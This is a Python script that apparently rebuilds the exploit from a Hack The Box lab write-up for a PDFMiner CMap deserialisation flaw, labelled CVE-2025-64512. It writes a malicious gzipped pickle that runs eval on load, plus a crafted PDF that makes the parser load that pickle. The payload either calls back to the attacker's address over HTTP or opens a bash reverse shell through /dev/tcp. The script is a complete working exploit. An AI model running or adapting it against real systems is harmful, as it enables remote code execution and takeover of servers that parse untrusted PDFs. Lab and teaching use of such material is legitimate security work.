#!/usr/bin/env python3
"""Rebuild the PDFMiner CVE-2025-64512 lab payload used in this writeup.

HTB Bedside only. Outputs a gzip pickle and PDF that references its absolute
path as a CMap. This is a reconstruction of the commands used during the lab.
"""
import argparse
import gzip
import pickle
from pathlib import Path

parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument('--mode', choices=('callback', 'shell'), required=True)
parser.add_argument('--lhost', default='10.10.14.206', help='VPN address on tun0')
parser.add_argument('--lport', type=int, help='Listener port (8000 callback, 4444 shell)')
parser.add_argument('--upload-dir', default='/var/www/research.bedside.htb/uploads')
parser.add_argument('--output-dir', default='.')
args = parser.parse_args()

port = args.lport if args.lport is not None else (8000 if args.mode == 'callback' else 4444)
name = 'cmap-net' if args.mode == 'callback' else 'cmap-shl'
stem = 'trigger-net' if args.mode == 'callback' else 'trigger-shl'

if args.mode == 'callback':
    url = f'http://{args.lhost}:{port}/'
    expression = (
        f"(__import__('urllib.request', fromlist=['urlopen'])"
        f".urlopen({url!r}, timeout=4).read(), "
        "{'CODE2CID': {}, 'IS_VERTICAL': False})[1]"
    )
else:
    command = f'bash -i >& /dev/tcp/{args.lhost}/{port} 0>&1'
    expression = (
        f"(__import__('subprocess').Popen("
        f"['/bin/bash', '-c', {command!r}], "
        "stdin=__import__('subprocess').DEVNULL, "
        "stdout=__import__('subprocess').DEVNULL, "
        "stderr=__import__('subprocess').DEVNULL, "
        "start_new_session=True), "
        "{'CODE2CID': {}, 'IS_VERTICAL': False})[1]"
    )

class Payload:
    def __reduce__(self):
        return eval, (expression,)

out = Path(args.output_dir)
out.mkdir(parents=True, exist_ok=True)
pickle_path = out / f'{name}.pickle.gz'
with gzip.open(pickle_path, 'wb') as f:
    pickle.dump(Payload(), f, protocol=2)

# PDF name escaping: #2F represents a slash in an /Encoding name.
path_without_suffix = f'{args.upload_dir.rstrip("/")}/{name}'
encoded = path_without_suffix.replace('/', '#2F')
stream = b'BT /F1 12 Tf 100 700 Td (Research test) Tj ET'
objects = [
    b'<< /Type /Catalog /Pages 2 0 R >>',
    b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>',
    b'<< /Length %d >>\nstream\n%s\nendstream' % (len(stream), stream),
    f'<< /Type /Font /Subtype /Type0 /BaseFont /TestFont /Encoding /{encoded} /DescendantFonts [6 0 R] >>'.encode(),
    b'<< /Type /Font /Subtype /CIDFontType2 /BaseFont /TestFont /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /FontDescriptor 7 0 R >>',
    b'<< /Type /FontDescriptor /FontName /TestFont /Flags 4 /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80 >>',
]
pdf = bytearray(b'%PDF-1.4\n')
offsets = [0]
for i, obj in enumerate(objects, 1):
    offsets.append(len(pdf))
    pdf += f'{i} 0 obj\n'.encode() + obj + b'\nendobj\n'
start = len(pdf)
pdf += f'xref\n0 {len(offsets)}\n0000000000 65535 f \n'.encode()
for offset in offsets[1:]:
    pdf += f'{offset:010d} 00000 n \n'.encode()
pdf += f'trailer\n<< /Size {len(offsets)} /Root 1 0 R >>\nstartxref\n{start}\n%%EOF\n'.encode()
pdf_path = out / f'{stem}.pdf'
pdf_path.write_bytes(pdf)

print(f'Created {pickle_path} and {pdf_path}')
print(f'PDF CMap references: {path_without_suffix}.pickle.gz')
